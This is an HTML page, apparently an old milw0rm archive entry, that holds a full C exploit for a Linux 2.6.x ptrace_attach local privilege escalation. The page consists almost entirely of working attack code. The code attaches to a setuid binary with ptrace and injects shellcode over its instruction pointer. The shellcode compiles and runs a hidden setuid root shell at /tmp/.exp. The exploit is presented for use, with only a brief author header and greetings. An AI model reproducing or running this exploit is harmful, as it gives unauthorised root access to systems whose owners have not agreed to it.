<html><head><title>Linux Kernel 2.6.x ptrace_attach Local Privilege Escalation Exploit </title></head><pre>/*
ptrace_attach privilege escalation exploit by s0m3b0dy

[*] tested on Gentoo 2.6.29rc1

grataz:
Tazo, rassta, nukedclx, maciek, D0hannuk, mivus, wacky, nejmo, filo...

email: s0m3b0dy1 (at) gmail.com
*/

#include &lt;grp.h&gt;
#include &lt;stdio.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;errno.h&gt;
#include &lt;paths.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;signal.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/wait.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;sys/param.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/ptrace.h&gt;
#include &lt;sys/socket.h&gt;
char shellcode[] =
&quot;\x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\xeb\x21\x5f\x6a\x0b\x58\x99&quot; 
&quot;\x52\x66\x68\x2d\x63\x89\xe6\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62&quot;
&quot;\x69\x6e\x89\xe3\x52\x57\x56\x53\x89\xe1\xcd\x80\xe8\xda\xff\xff\xff&quot;
&quot;echo \&quot;#include &lt;stdio.h&gt;\nmain(){setuid(0);if(getuid()==0) printf(\\\&quot;r00teed!\\n\\\&quot;);execv(\\\&quot;/bin/bash\\\&quot;,0);return 0;}\&quot; &gt; /tmp/.exp.c;gcc /tmp/.exp.c -o /tmp/.exp;rm /tmp/.exp.c;chmod +s /tmp/.exp;exit;&quot;;
struct user_regs_struct322 {
        unsigned long ebx, ecx, edx, esi, edi, ebp, eax;
        unsigned short ds, __ds, es, __es;
        unsigned short fs, __fs, gs, __gs;
        unsigned long orig_eax, eip;
        unsigned short cs, __cs;
        unsigned long eflags, esp;
        unsigned short ss, __ss;
};

main()
{
struct user_regs_struct322  regs;
struct stat buf;
int i,o;
unsigned long * src;
unsigned long * dst;
char *env[2];
env[0]=&quot;/usr/bin/gpasswd&quot;;  // some suid file
env[1]=0;
if((o=fork()) == 0)
{
execve(env[0],env,0);
exit(0);
}
if(ptrace(PTRACE_ATTACH,o,0,0)==-1)
{
printf(&quot;\n[-] Attach\n&quot;);
exit(0);
}
 wait((int *)0);
if (ptrace(PTRACE_GETREGS, o, NULL, &amp;regs) == -1){
                printf(&quot;\n[-] read registers\n&quot;);
		exit(0);
}
printf( &quot;[+] EIP - 0x%08lx\n&quot;, regs.eip);
dst= (unsigned long *) regs.eip;
src = (unsigned long *) shellcode;
for(i=0;i&lt;sizeof(shellcode) -1;i+=4)
if (ptrace(PTRACE_POKETEXT, o, dst++, *src++) == -1){
                       printf(&quot;\n[-] write shellcode\n&quot;);
			exit(0);
}
ptrace(PTRACE_CONT, o, 0, 0);
ptrace(PTRACE_DETACH,o,0,0);
printf(&quot;[+] Waiting for root...\n&quot;);
sleep(2);
if(!stat(&quot;/tmp/.exp&quot;,&amp;buf))
{
printf(&quot;[+] Executing suid shell /tmp/.exp...\n&quot;); 
execv(&quot;/tmp/.exp&quot;,0);
}
else
{
printf(&quot;[-] Damn no r00t here :(\n&quot;);
}
return 0;
}

// milw0rm.com [2009-05-13]</pre></html>